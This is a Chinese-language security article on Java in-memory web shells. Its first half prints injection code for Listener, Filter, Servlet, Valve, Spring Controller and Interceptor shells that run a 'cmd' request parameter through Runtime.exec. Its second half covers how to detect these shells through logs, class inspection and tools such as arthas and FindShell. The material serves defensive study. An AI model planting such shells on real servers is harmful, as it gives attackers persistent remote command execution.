# **简介**
利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。

修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

另外，在Tomcat 和 JBoss 中，还可以基于Valve组件添加恶意代码。

![](https://cdn.nlark.com/yuque/0/2024/png/38747917/1723016480005-51000dc8-f302-4354-b156-1dc32d9fd0bc.png)

Listener，Filter，Servlet的关系如上图所示，

Listener 用于监听 Web 应用程序的特定事件（e.g. Session创建）

Filter 用于对 Web 资源进行预处理和后处理（e.g. 身份验证）

Servlet 则是 Web 应用程序的核心,用于处理客户端的请求并生成响应（e.g. 响应HTTP）。

![](https://cdn.nlark.com/yuque/0/2024/png/38747917/1723016480199-f43b5fed-270f-4caa-93e5-4627c17da590.png)

Filter，Intercepter，Controller的关系如上图所示

Filter 位于最外层,对所有进出 Web 应用程序的请求和响应进行拦截和处理。

Interceptor 位于 Filter 和 Controller 之间,对进入 Controller 的请求进行拦截和处理。

Controller 位于最内层,负责具体的业务逻辑处理,并返回相应的 HTTP 响应。

## **Listener类内存马**
Listener类内存马，实现方式如下：

1. 获取StandardContext上下文
2. 实现一个恶意Listener
3. 通过StandardContext#addApplicationEventListener方法添加恶意Listener

实例：

```java
......  
public class Shell_Listener implements ServletRequestListener {

    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
                ......                     
                <%
                // 通过反射获取 request 对象的 request 属性
                Field reqF = request.getClass().getDeclaredField("request");
                // 设置属性可访问
                reqF.setAccessible(true);
                // 获取 request 属性的值，转换为 Request 对象
                Request req = (Request) reqF.get(request);
                // 获取 Request 对象的 Context
                StandardContext context = (StandardContext) req.getContext();

                // 创建一个 Shell_Listener 对象
                Shell_Listener shell_Listener = new Shell_Listener();
                // 将 Shell_Listener 对象添加到 Context 中作为应用程序事件监听器
                context.addApplicationEventListener(shell_Listener);
                %>
```

## **Filter类内存马**
动态添加恶意Filter的思路如下



获取StandardContext对象

创建恶意Filter

使用FilterDef对Filter进行封装，并添加必要的属性

创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中

使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中

实例：

```java
......            

<%! public class Shell_Filter implements Filter {
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
......            


%>

<%
    // 创建一个新的Shell_Filter实例
    Shell_Filter filter = new Shell_Filter();

    // 设置过滤器的名称为"CommonFilter"
    String name = "CommonFilter";

    // 创建一个新的FilterDef实例并设置相关属性
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    // 将过滤器定义添加到standardContext中
    standardContext.addFilterDef(filterDef);


    // 创建一个新的FilterMap实例并设置相关属性
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());

    // 将过滤器映射添加到standardContext中
    standardContext.addFilterMapBefore(filterMap);


    // 获取standardContext类中的filterConfigs属性
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    // 创建一个新的ApplicationFilterConfig实例并添加到filterConfigs中
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
    filterConfigs.put(name, filterConfig);
%>
```

## Servlet类内存马
创建Servlet的流程



获取StandardContext对象

编写恶意Servlet

通过StandardContext.createWrapper()创建StandardWrapper对象

设置StandardWrapper对象的loadOnStartup属性值

设置StandardWrapper对象的ServletName属性值

设置StandardWrapper对象的ServletClass属性值

将StandardWrapper对象添加进StandardContext对象的children属性中

通过StandardContext.addServletMappingDecoded()添加对应的路径映射

实例：

```java
......      
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
......      
%>

<%
    // 创建一个新的 Shell_Servlet 实例
    Shell_Servlet shell_servlet = new Shell_Servlet();

    // 获取 Shell_Servlet 类的简单名称
    String name = shell_servlet.getClass().getSimpleName();

    // 创建一个新的 Wrapper 实例
    Wrapper wrapper = standardContext.createWrapper();

    // 设置 Wrapper 的加载优先级为 1
    wrapper.setLoadOnStartup(1);

    // 设置 Wrapper 的名称
    wrapper.setName(name);

    // 设置 Wrapper 的 Servlet 实例
    wrapper.setServlet(shell_servlet);

    // 设置 Wrapper 的 Servlet 类名
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>

<%
    // 将 Wrapper 添加到 standardContext 中
    standardContext.addChild(wrapper);

    // 将 "/shell" URL 映射到 Wrapper
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

**Value类内存马**

Valve型内存马的注入思路



获取StandardContext对象

通过StandardContext对象获取StandardPipeline

编写恶意Valve

通过StandardPipeline.addValve()动态添加Valve

实例：

```java
......      

        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
......    
<%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%>
```

## Controller类内存马
动态的注册Controller，思路如下



获取上下文环境

注册恶意Controller 

配置路径映射

实例：

```java
......    

@Controller
public class shell_controller {


    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}

```

## Interceptor类内存马
可以仿照Filter型内存马的实现思路



获取当前运行环境的上下文

实现恶意Interceptor

注入恶意Interceptor

```java

......   
@Controller
public class Inject_Shell_Interceptor_Controller {

    @ResponseBody
    @RequestMapping("/inject")
    public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        //获取上下文环境
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

        //获取adaptedInterceptors属性值
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);


        //将恶意Interceptor添加入adaptedInterceptors
        Shell_Interceptor shell_interceptor = new Shell_Interceptor();
        adaptedInterceptors.add(shell_interceptor);
    }

    public class Shell_Interceptor implements HandlerInterceptor{
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
......   

```

## Agent内存马
Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。

```java
......    
@WebServlet("/response")
public class Tomcat_Echo_Response extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        //获取StandardService
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        System.out.println(standardContext);

        try {
            //获取ApplicationContext
            Field applicationContextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);

            //获取StandardService
            Field standardServiceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            standardServiceField.setAccessible(true);
            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);

            //获取Connector
            Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectorsField.setAccessible(true);
            Connector[] connectors = (Connector[]) connectorsField.get(standardService);
            Connector connector = connectors[0];

            //获取Handler
            ProtocolHandler protocolHandler = connector.getProtocolHandler();
            Field handlerField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

            //获取内部类AbstractProtocol$ConnectionHandler的global属性
            Field globalHandler = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalHandler.setAccessible(true);
            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);

            //获取processors
            Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processorsField.setAccessible(true);
            List<RequestInfo> requestInfoList = (List<RequestInfo>) processorsField.get(global);

            //获取request和response
            Field requestField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            requestField.setAccessible(true);
            for (RequestInfo requestInfo : requestInfoList){

                //获取org.apache.coyote.Request
                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);

                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
                org.apache.catalina.connector.Response http_response = http_request.getResponse();

                PrintWriter writer = http_response.getWriter();
                String cmd = http_request.getParameter("cmd");

                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            }
 ......   

```

# 排查思路
## 基于各组件变化
①新增、修改的类；

②没有对应class文件的类

③xml配置中没注册的类

④冰蝎等常见工具使用的类（com. sun.org.apache.bcel.internal.uti.classloader /com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader）

⑤filterchain中排第一的filter类



## 基于日志
如果是jsp注入，日志中排查可疑jsp的访问请求。

如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法

根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。

如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。

如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200

例如：

定位攻击者攻击时间，提取请求路径，排查可疑的请求。



针对提取的路径，排查访问页面不存在但是日志里的返回200状态码。

![](https://cdn.nlark.com/yuque/0/2024/png/38747917/1723016480432-68b0d15b-b013-4dac-9fac-bdaf3846465f.png)



![](https://cdn.nlark.com/yuque/0/2024/png/38747917/1723016480691-53132292-f95f-46d9-8cbd-f4c3cceb2969.png)

正常请求.xxx文件后缀，如图片。返回大小相同，如果是内存马返回的大小可能就不同，该路径可能就是内存马。

![](https://cdn.nlark.com/yuque/0/2024/png/38747917/1723016480836-4e7f89e5-d646-4e1f-b7d0-994f0aabc27e.png)

# 查杀工具
## 方法一:arthas
arthas为一款监控诊断产品，通过全局视角实时查看应用 load、内存、gc、线程的状态信息。可使用该工具对内存马排查和分析。如攻击者隐藏的深可将所有的类都反编译导出来然后逐一排查。

项目地址：[<font style="color:#003884;">https://github.com/alibaba/arthas</font>](https://github.com/alibaba/arthas)



java -jar arthas-boot.jar

主要关注如下命令:

    - sc一一查看JVM 已加载的类信息    

    - sc *.Filter,sc *.Servlet- jad一一反编译指定已加载类的源码    

    - jad --source-only org.apache.jsp.jsp.jsp2.el.shell_jsp- dump一一dump 已加载类的 byte code到特定目录    

    - dump org.apache.jsp.jsp.jsp2.el.shell_jsp- classloader一一查看 classloader 的继承树，urls，类加载信息

查看Servlet、Filter信息，排查异常Filter/Servlet节点。



## 方法二:tomcat-memshell-scanner.jsp
tomcat-memshell-scanner.jsp是通过jsp脚本扫描并查杀各类中间件内存马，放在可能被注入内存马的web录下，然后使用浏览器访问即可直接获得扫描结果。

项目地址:[<font style="color:#003884;">https://github.com/c0ny1/java-memshell-scanner</font>](https://github.com/c0ny1/java-memshell-scanner)

可以dump可疑class文件进行反编译排查，kill可直接断开内存马。



## 方法三:FindShell
FindShell是一个自动化的内存马查杀工具,可以用于普通内存马和Java Agent内存马。

项目地址:[<font style="color:#003884;">https://github.com/geekmc/FindShell</font>](https://github.com/geekmc/FindShell)

java -jar FindShell-1.0.jar --pid XXXX --debug*

自动在当前out文件夹下面输出dump下来的可疑字节码,我们也可对dump下来的class文件进行反编译分析。

jad -s java shell_jsp.class



## 方法四:copagent


copagent用于进行内存马查杀工具,会显示所有运行的类以及危险等级,比较高的可以进入目录查看代码进行分析。

项目地址:[<font style="color:#003884;">https://github.com/ofmkms/copagent</font>](https://github.com/ofmkms/copagent)

java -jar cop.jar

根据扫描结果result.txt，根据扫描得到的目录文件进行排查。





# 参考资料
[<font style="color:#003884;">JAVA内存马研究0到1 | ckcsec</font>](https://wiki.ckcsec.cn/web/basis/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B60%E5%88%B01.html#_6-4%E3%80%81agent%E5%86%85%E5%AD%98%E9%A9%AC)

[<font style="color:#003884;">https://mp.weixin.qq.com/s/8P0SV0WqF_sNE60193ilVg</font>](https://mp.weixin.qq.com/s/8P0SV0WqF_sNE60193ilVg)

